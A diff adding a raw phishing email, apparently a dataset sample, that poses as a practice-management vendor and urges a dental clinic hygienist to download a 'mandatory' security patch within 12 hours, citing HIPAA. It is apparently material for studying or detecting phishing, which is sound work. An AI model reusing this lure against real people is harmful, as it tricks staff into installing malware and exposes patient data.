@@ -1,0 +1,38 @@
+From: "Practice Management Update" <updates@practicemgmt-system.com>
+To: jen.hygienist@smileclinic.org
+Subject: Critical System Update Required
+Date: Tue, 2 Dec 2025 07:28:43 -0800
+Message-ID: 20251202072843.37904@mail.sender.com
+Return-Path: updates@practicemgmt-system.com
+Reply-To: updates@practicemgmt-system.com
+Received: from relay.mailhost.com (relay.mailhost.com [192.0.2.173])
+    by gateway.smileclinic.org with ESMTP id xyz7804
+    for jen.hygienist@smileclinic.org; Tue, 2 Dec 2025 07:28:43 -0800
+Authentication-Results: gateway.smileclinic.org;
+    spf=neutral smtp.mailfrom=updates@practicemgmt-system.com;
+    dmarc=none header.from=updates@practicemgmt-system.com
+Content-Type: multipart/alternative; boundary="boundary-alt-379"
+
+--boundary-alt-379
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Dear User,
+
+A critical security patch for your practice management software must be installed within 12 hours.
+
+Failure to update will leave your system vulnerable to data breaches and patient information theft.
+
+Download and install the update immediately:
+https://practice-update-center.com/security-patch
+
+This update is mandatory for HIPAA compliance.
+
+System Administrator
+
+--boundary-alt-379
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body><p>Dear User,</p><p>A critical security patch for your practice management software must be installed within 12 hours.</p><p>Failure to update will leave your system vulnerable to data breaches and patient information theft.</p><p>Download and install the update immediately:<br><a href="https://practice-update-center.com/security-patch">https://practice-update-center.com/security-patch</a></p><p><strong>This update is mandatory for HIPAA compliance.</strong></p><p>System Administrator</p></body></html>
+--boundary-alt-379--
